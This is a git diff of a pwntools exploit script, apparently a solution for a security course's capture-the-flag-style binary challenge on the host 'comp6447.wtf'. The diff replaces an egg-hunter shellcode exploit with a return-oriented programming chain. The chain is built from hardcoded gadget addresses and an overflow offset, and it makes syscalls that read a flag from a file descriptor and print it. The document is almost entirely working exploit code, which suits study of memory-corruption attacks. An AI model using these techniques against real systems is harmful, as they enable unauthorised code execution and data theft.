@@ -6,11 +6,11 @@ from pwn import *
 
 # Set up pwntools for the correct architecture
 context.update(arch='i386')
-exe = './find-me' #Change this
+exe = './roporshellcode' #Change this
 
 PROGNAME = exe
 REMOTE = "comp6447.wtf" #Change this
-REMOTEPORT = 24973 #Change this
+REMOTEPORT = 28180 #Change this
 global p
 global e
 global global_timeout
@@ -40,61 +40,62 @@ continue
 if args.REMOTE:
     global_timeout = 3
     p = remote(REMOTE, REMOTEPORT)
+    libc = ELF('./libc-2.23.so')
 else:
     global_timeout = 0.5
     p = process(PROGNAME)
     p = start()
+    libc = ELF('/lib/i386-linux-gnu/libc-2.27.so')
 #===========================================================
 #                    EXPLOIT GOES HERE
 #===========================================================
-# The first four instructions are equivalent to 0x4f904790.
-# This is our egg.
+offset = cyclic_find(0x61616164)
+pop_ebx = p32(0x08049022)
+mov_eax_0_leave = p32(0x08049275)
+eax_ecx = p32(0x080491c4)
+ebx_edx = p32(0x080491cd)
+eax_edx__ebx_edx = p32(0x080491cb)
+inc_edx = p32(0x080491d0)
+ebp_esp = p32(0x080491b7)
+ecx_esp = p32(0x080491ff)
+sub_ecx_4 = p32(0x080491c0)
+xor_edx = p32(0x080491ba)
+int_0x80 = p32(0x080491bd)
 
-# Egg hunter
-small_assembly = """
-_start:
-mov edx, 0x4f904790
-loop:
-inc eax
-cmp dword ptr [eax], edx
-jne loop
-jmp eax
-"""
+writable_region = p32(0x80491a9) #p32(0x8048388)  
 
-# Egg + Shellcode
-large_assembly = """
-nop
-inc edi
-nop
-dec edi
+p.recvuntil(b'fd: ', drop=True)
+fd = p.recvline()
+log.info(f"flag at fd: {int(fd)}")
+p.recvline()
 
-xor ecx, ecx
-mul ecx
+chain = (
+    xor_edx
+    + inc_edx*3
+    + eax_edx__ebx_edx
+    + ebp_esp
+    + ecx_esp
+    + inc_edx*97
+    + int_0x80
 
-sub esp, 400
-mov ecx, esp
-mov ebx, 1000
-mov eax, 0x3
-mov edx, 0xFF
-int 0x80
+    + xor_edx
+    + inc_edx*4
+    + eax_edx__ebx_edx
+    + pop_ebx
+    + p32(1)
+    + inc_edx*96
+    + int_0x80
 
-mov eax, 0x4
-mov ebx, 0x1
-int 0x80
+    + xor_edx
+    + inc_edx
+    + int_0x80
+)
 
-mov eax, 0x1
-int 0x80
-"""
+payload = fit ({
+    offset-4: writable_region,
+    offset: chain
+})
 
-
-
-small_asm = asm(small_assembly)
-large_asm = asm(large_assembly)
-
-p.recvuntil(b'smallbuf shellcode', drop=True)
-p.sendline(small_asm)
-p.recvuntil(b'bigbuf shellcode:', drop=True)
-p.sendline(large_asm)
-
+p.sendline(payload)
 p.interactive()
 
